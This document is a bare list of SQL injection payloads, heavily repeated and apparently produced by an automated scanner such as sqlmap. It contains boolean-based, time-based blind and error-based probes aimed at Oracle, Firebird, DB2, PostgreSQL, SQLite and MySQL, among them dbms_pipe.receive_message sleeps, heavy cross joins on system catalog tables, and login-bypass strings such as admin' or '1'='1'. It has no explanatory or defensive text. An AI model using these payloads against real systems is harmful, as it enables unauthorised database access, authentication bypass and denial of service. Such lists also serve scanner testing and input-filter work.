+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+or 'unusual'   =   'unusual'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --
+1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'
+1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'   )    )    and 2832  =  4165--
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+admin"  )   or   (  "1"  =  "1"--
+1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1"   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  
+1"  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+admin"  )   or   (  "1"  =  "1"--
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  '
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou
+1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1"   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+or 'unusual'   =   'unusual'
+1"   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+admin"  )   or   (  "1"  =  "1"--
+1" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-2583"  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%"   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+admin' or '1'  =  '1'/*
+1"  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  '
+1"  )   as jidc where 6093  =  6093 and 9198  =  9198--
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%"   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '
+select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou
+1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  "
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-1617%" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and "%"  =  "
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'   )    )    and 2832  =  4165--
+admin' or '1'  =  '1'/*
+1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'   )    )    and 2832  =  4165--
+1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+-8673"  )   or make_set  (  9354  =  9354,7185  )   and   (  "edap" like "edap
